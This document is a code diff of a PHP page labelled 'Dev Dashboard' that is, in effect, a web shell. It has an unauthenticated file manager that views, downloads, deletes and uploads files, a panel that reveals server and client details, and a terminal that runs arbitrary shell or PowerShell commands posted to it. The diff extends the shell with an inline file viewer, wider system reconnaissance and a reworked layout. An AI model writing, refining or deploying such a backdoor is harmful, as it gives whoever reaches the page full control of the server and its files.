@@ -1,6 +1,6 @@
 <?php
 // ------------- CONFIG & INPUT --------------
-$cwd = $_POST['cwd'] ?? getcwd();
+$cwd = $_GET['cwd'] ?? $_POST['cwd'] ?? getcwd();
 $cmd = $_POST['cmd'] ?? '';
 $mode = $_POST['mode'] ?? 'shell';
 
@@ -12,13 +12,15 @@ if (isset($_GET['dir'])) {
     }
 }
 
-// File actions: view, delete, download
+// -------------------- FILE VIEWER --------------------
+$view_content = null;
+$view_file = null;
+
 if (isset($_GET['view'])) {
     $file = $_GET['view'];
-    if (file_exists($file)) {
-        header('Content-Type: text/plain; charset=utf-8');
-        echo file_get_contents($file);
-        exit;
+    if (file_exists($file) && is_file($file)) {
+        $view_file = $file;
+        $view_content = htmlspecialchars(file_get_contents($file));
     }
 }
 
@@ -43,11 +45,14 @@ if (isset($_GET['download'])) {
 // Functions
 function sys_info() {
     return [
-        'Hostname' => gethostname(),
-        'IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
-        'User' => get_current_user(),
-        'PHP Version' => PHP_VERSION,
-        'SysInfo' => php_uname('a')
+        'Hostname'        => gethostname(),
+        'Current User'    => get_current_user(),
+        'Server IP'       => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
+        'Client IP'       => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
+        'Server Port'     => $_SERVER['SERVER_PORT'] ?? 'Unknown',
+        'Document Root'   => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
+        'OS Info' => php_uname('a')
     ];
 }
 
@@ -103,7 +108,11 @@ if ($_FILES['upload']['tmp_name'] ?? false) {
     padding: 1rem; overflow-y: auto;
   }
   #file-manager {
-    flex: 1.5; display: flex; flex-direction: column;
+    flex: 1.5;
+    display: flex;
+    flex-direction: column;
+    margin: 0;
+    overflow: hidden; /* important */
   }
   #file-manager table {
     width: 100%; border-collapse: collapse;
@@ -133,8 +142,8 @@ if ($_FILES['upload']['tmp_name'] ?? false) {
   a.folder { color:#fbc02d; font-weight: 700; cursor: pointer; }
   
   #system-info {
-    flex: 1;
-    margin-bottom: 1rem;
+    flex: 0.5;
+    margin-bottom: 0.1rem;
   }
   #system-info ul {
     list-style: none; padding: 0;
@@ -144,7 +153,7 @@ if ($_FILES['upload']['tmp_name'] ?? false) {
     padding: 0.3rem 0;
   }
   #terminal {
-    flex: 1;
+    flex: 2.6;
     display: flex; flex-direction: column;
   }
   #terminal form {
@@ -179,6 +188,22 @@ if ($_FILES['upload']['tmp_name'] ?? false) {
     white-space: pre-wrap;
     box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
   }
+  .fm-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+    gap: 10px;
+}
+.fm-header h2 {
+    margin: 0;
+    font-size: 1.3em;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    flex: 1;
+    min-width: 0;
+}
 </style>
 </head>
 <body>
@@ -186,100 +211,117 @@ if ($_FILES['upload']['tmp_name'] ?? false) {
 <header>Dev Dashboard</header>
 
 <main>
-  <!-- File Manager Section -->
-  <section id="file-manager" tabindex="0">
-    <h2>File Manager: <?php echo htmlspecialchars($cwd); ?></h2>
-    <table>
-      <thead>
-        <tr>
-          <th>Name</th><th>Size</th><th>Modified</th><th>Actions</th>
-        </tr>
-      </thead>
-      <tbody>
-        <?php
-          $parent = dirname($cwd);
-          if ($parent !== $cwd) {
-            echo "<tr><td colspan='4'><a href='?dir=" . urlencode($parent) . "' class='folder'>.. (Parent Directory)</a></td></tr>";
-          }
-          foreach(list_files($cwd) as $file):
-            $path = $cwd . DIRECTORY_SEPARATOR . $file;
-            $is_dir = is_dir($path);
-            $size = $is_dir ? "Folder" : number_format(filesize($path)) . " Bytes";
-            $mtime = date("Y-m-d H:i:s", filemtime($path));
-        ?>
-        <tr>
-          <td>
-            <?php if($is_dir): ?>
-              <a href="?dir=<?php echo urlencode($path); ?>" class="folder">&#128193; <?php echo htmlspecialchars($file); ?></a>
-            <?php else: ?>
-              &#128459; <?php echo htmlspecialchars($file); ?>
-            <?php endif; ?>
-          </td>
-          <td><?php echo $size; ?></td>
-          <td><?php echo $mtime; ?></td>
-          <td>
-            <?php if(!$is_dir): ?>
-              <a href="?view=<?php echo urlencode($path); ?>" target="_blank" class="action-btn view" title="View">👁️</a>
-              <a href="?download=<?php echo urlencode($path); ?>" class="action-btn download" title="Download">⬇️</a>
-              <a href="?delete=<?php echo urlencode($path); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($file); ?>?');" class="action-btn delete" title="Delete">🗑️</a>
-            <?php else: ?>
-              -
-            <?php endif; ?>
-          </td>
-        </tr>
-        <?php endforeach; ?>
-      </tbody>
-    </table>
+<section id="file-manager" tabindex="0">
+<div class="fm-header">
+<h2>File Manager: <?php echo htmlspecialchars($cwd); ?></h2>
+<form method="post" enctype="multipart/form-data" style="margin:0;">
+<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
+<input type="file" name="upload" required>
+<button type="submit">Upload</button>
+</form>
+</div>
 
-    <form method="post" enctype="multipart/form-data" style="margin-top:1rem;">
-      <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
-      <input type="file" name="upload" required>
-      <button type="submit">Upload File</button>
-    </form>
-  </section>
+<div style="flex:1; overflow:auto;">
+<table>
+<thead>
+<tr>
+<th>Name</th><th>Size</th><th>Modified</th><th>Actions</th>
+</tr>
+</thead>
+<tbody>
 
-  <!-- Right Column: System Info + Terminal -->
-  <section style="flex:1; display:flex; flex-direction:column; gap:1rem;">
+<?php
+$parent = dirname($cwd);
+if ($parent !== $cwd) {
+echo "<tr><td colspan='4'><a href='?dir=" . urlencode($parent) . "&cwd=" . urlencode($parent) . "' class='folder'>.. (Parent Directory)</a></td></tr>";
+}
 
-    <!-- System Info -->
-    <div id="system-info">
-      <h2>System Info</h2>
-      <ul>
-        <?php foreach(sys_info() as $k => $v): ?>
-          <li><strong><?php echo $k; ?>:</strong> <?php echo htmlspecialchars($v); ?></li>
-        <?php endforeach; ?>
-      </ul>
-    </div>
+foreach(list_files($cwd) as $file):
+$path = $cwd . DIRECTORY_SEPARATOR . $file;
+$is_dir = is_dir($path);
+$size = $is_dir ? "Folder" : number_format(filesize($path)) . " Bytes";
+$mtime = date("Y-m-d H:i:s", filemtime($path));
+?>
 
-    <!-- Terminal -->
-    <div id="terminal">
-      <h2>Interactive Terminal</h2>
-      <form id="term-form" method="post" onsubmit="return runCommand(event)">
-        <select name="mode" id="mode">
-          <option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>Shell</option>
-          <option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
-        </select>
-        <input type="text" name="cmd" id="cmd-input" placeholder="Enter command..." autocomplete="off" required>
-        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
-        <button type="submit">Run ▶</button>
-      </form>
-      <pre id="output"><?php
-        if ($cmd) {
-          echo htmlspecialchars(exec_command($cmd, $mode));
-        }
-      ?></pre>
-    </div>
-  </section>
+<tr>
+<td>
+<?php if($is_dir): ?>
+<a href="?dir=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($path); ?>" class="folder">&#128193; <?php echo htmlspecialchars($file); ?></a>
+<?php else: ?>
+&#128459; <?php echo htmlspecialchars($file); ?>
+<?php endif; ?>
+</td>
+<td><?php echo $size; ?></td>
+<td><?php echo $mtime; ?></td>
+<td>
+<?php if(!$is_dir): ?>
+<a href="?view=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($cwd); ?>" class="action-btn view">👁️</a>
+<a href="?download=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($cwd); ?>" class="action-btn download">⬇️</a>
+<a href="?delete=<?php echo urlencode($path); ?>&cwd=<?php echo urlencode($cwd); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($file); ?>?');" class="action-btn delete">🗑️</a>
+<?php else: ?> -
+<?php endif; ?>
+</td>
+</tr>
+
+<?php endforeach; ?>
+</tbody>
+</table>
+</div>
+
+
+<?php if ($view_content !== null): ?>
+<div style="flex:1; display:flex; flex-direction:column; overflow:hidden;">
+    <hr>
+    <p style="
+    margin:0 0 10px 0;
+    font-size:1.17em;
+    font-weight:bold;
+    ">
+    File Viewer: <?php echo htmlspecialchars($view_file); ?>
+    </p>
+    <pre style="
+        background:black;
+        color:#00ff00;
+        padding:10px;
+        overflow:auto;
+        flex:1;
+        margin:0;
+    "><?php echo $view_content; ?></pre>
+</div>
+<?php endif; ?>
+
+</section>
+
+<section style="flex:1; display:flex; flex-direction:column; gap:1rem;">
+
+<div id="system-info">
+<h2>System Info</h2>
+<ul>
+<?php foreach(sys_info() as $k => $v): ?>
+<li><strong><?php echo $k; ?>:</strong> <?php echo htmlspecialchars($v); ?></li>
+<?php endforeach; ?>
+</ul>
+</div>
+
+<div id="terminal">
+<h2>Interactive Terminal</h2>
+<form method="post">
+<select name="mode">
+<option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>Shell</option>
+<option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
+</select>
+<input type="text" name="cmd" required>
+<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
+<button type="submit">Run ▶</button>
+</form>
+<pre id="output"><?php
+if ($cmd) {
+echo htmlspecialchars(exec_command($cmd, $mode));
+}
+?></pre>
+</div>
+
+</section>
 </main>
-
-<script>
-  // Optional: Scroll output to bottom after each run
-  function runCommand(event) {
-    // The form will submit normally (page reload) because PHP runs server-side.
-    // For a real interactive terminal, you would need AJAX. Here we keep it simple.
-    return true;
-  }
-</script>
-
 </body>
 </html>
